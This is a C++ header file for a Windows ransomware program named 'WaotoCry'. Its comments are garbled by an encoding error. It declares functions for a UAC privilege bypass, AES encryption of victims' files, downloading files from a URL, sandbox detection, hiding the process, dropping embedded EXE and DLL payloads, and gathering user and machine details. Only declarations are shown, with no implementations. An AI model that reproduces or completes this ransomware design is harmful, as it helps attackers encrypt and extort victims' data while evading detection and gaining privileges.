#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include  <direct.h>  
#include <tchar.h>
#include "resource.h"
#pragma comment(lib,"URlmon")
#pragma warning(disable :4996)
#define MAX_SIZE 255

using namespace std;




typedef struct 
{
	int Proconn_data;//��������
	int process_break_sendbox;
	char* get_process_dir;//��ȡ����Ŀ¼
	char*  process_new_path;//�������ڵ�·��
	string process_pid_path;//ͨ��PID��ȡ����·��
	string target_process_path;//Ŀ�����·��
	string usl_path;//URL����·��
	DWORD get_pid;//��ȡPID
	BOOL search;//����
	BOOL off;//���ƿ���
}WaotoCry;

typedef struct {
	string public_key;//��Կ
	string private_key;//˽Կ
	string encryption_data;//���ܺ������
	string uncryption_data;//���ܺ������
}WaotoCry_encryption;





//static string file_Config_dir = "C:\\Users\\Public\\Documents\\dD0bB0";
static string file_Config_dir = "C:\\Process File\\dD0bB0";


//Bypass.cpp
/*
* @brief UAC��Ȩģ��
* @praram new_process_path ��ǰ�������ڵ�·��
*/
int add_double_data(char* new_process_path);
/*
* @brief ����������
* @praram ��ǰ�������ڵ�·��
*/
int increase(char* start_process);
/*
* @brief ����ָ��ע����ֵ�Ƿ����
*/
int search_regedit();
/*
* @brief ��������ģ��[�����������UAC��Ȩ]
*/
int BypassUAC();

//Encryption.cpp
/*
* @brief �����ļ�
* @praram process_path ����Ҫ���ܵ��ļ�ȫ·��
*/
int Encryption(char process_path);
/*
* @brief AES����ģ��
*/
int Aes_Encryption_Funtion(BYTE* ppassword, DWORD dwpasswordLength, BYTE* pData, DWORD& dwDatalength, DWORD dwBufferLength);
/*
* @brief AES����ģ��
*/
int AES_decrypt_Funtion(BYTE* pPassword, DWORD dwPasswordlength, BYTE* pData, DWORD& dwDataLength, DWORD dwbufferLength); 

/*
* @brief ����һ�������õ���Կ
* @praram msg ����
* @praram key ��Կ(���Լ�������)
*/
std::string extend_key(std::string& msg, std::string& key);
 /**
* @brief ��������Կģ��(���ڽ�������)
* @param msg δ���ܵ�����
* @param key �㴴���Ĺ�Կ
*/
std::string encrypt_vigenere(std::string& msg, std::string& key); //? vigenere ����ģ��
/*
* @brief  ����ģ��
* @param encryptedMsg ��Ҫ���ܵ�����
* @praram newKey �ɺ���[extend_key]���ɵĽ�����Կ
*/
std::string decrypt_vigenere(std::string& encryptedMsg, std::string& newKey); //? vigenere ����ģ��

//Connect
/*
* @brief ����ģ��
* @praram usl ����URL
* @praram file_name ���ص����غ������
*/
int download(string usl, string file_name);


//Funtions
/*
* @brief ���ɼ����õ���Կ
*/
string password();
/*
* @brief �������д���
*/
void no_windows();
/*
* @brief  ��ȡ��ǰPROCESS·��
*/
char *new_process_path(); 
/*
* @brief ��ȡ�������ڵ�Ŀ¼
*/
char *Get_Process_in_dir();
/*
* @brief �޸��ַ�����ָ���ַ�
* @praram no_replace ���޸ĵ��ַ���
* @praram need_relace_string ��Ҫ����[�޸�]���ַ���
* @praram befor_replace  �滻��Ҫ�޸ĵ��ַ���
*/
string replace_string(string no_replace, string need_relace_string, string befor_replace);
/*
* @brief �޸��ļ�����
* @praram old_name ԭ�ļ���
* @praram new_name �޸ĺ���ļ���
*/
int reaname(char *old_name, char *new_name); 
/*
* @brief ��ȡ�û���
*/
string windows_username();
/*
* @brief ��ȡ�������
*/
wstring windows_computer_name(); 
/*
* @brief �����ļ���Ŀ¼
* @praram ��Ҫ������λ��
*/
bool windows_dir(string eatablish_path); 


//Anti Sendbox
/*
* @brief ��ȡ��ǰ����[�Լ�]����PID
* @praram pid �����Լ���PID
*/
DWORD get_parent_processid(DWORD pid);
/*
* @praram ��ȡExplorer��PID
*/
DWORD get_explorer_processid();
/*
* @brief ��ɳ�����[Anti SendBOX]
*/
int determine();
/*
* @brief ��ȡָ�����̵�PID
* @praram name ��Ҫ��ȡ���̵�����
*/
DWORD GetProcesspId(const char* name);
/*
* @brief ͨ��PID��ȡ���̱���·��
* @praram process_pid ���̵�PID
*/
string process_pid_to_path(DWORD process_pid);


//File operation
bool CreateMyFile(char* strFilePath, LPBYTE lpBuffer, DWORD dwSize);
/*
* @brief �ͷ���Դ�ļ�
* @praram strFilePath ��Դ�ļ��ͷŵ�·��
* @praram nResourceID ��Դ�ļ���Resource.h�е��ļ�ID
* @praram strResourceName �ͷŵ��ļ�����[EXP:exe--dll--jpg--png]
*/
bool CreateEXE(char* strFilePath, int nResourceID, char* strResourceName);
BOOL ReleaseDLLRes(LPCTSTR szDLLFullPath, UINT uResID, LPCTSTR szResType);//�ͷ�DLL��ָ��Ŀ¼
/*
* @brief ��ȡϵͳTEMP��·��
*/
char Getsystemtamppath(); 



//kernel.cpp
/*
* @brief ���ؽ���
* @praram ������
*/
int hide_process(string process);


//search_regedit_information.cpp
/*
* @brief ��ѯCPU�ͺ�
*/
WCHAR search_regedit_CPU_information();
char search_regedit_GPU_information();
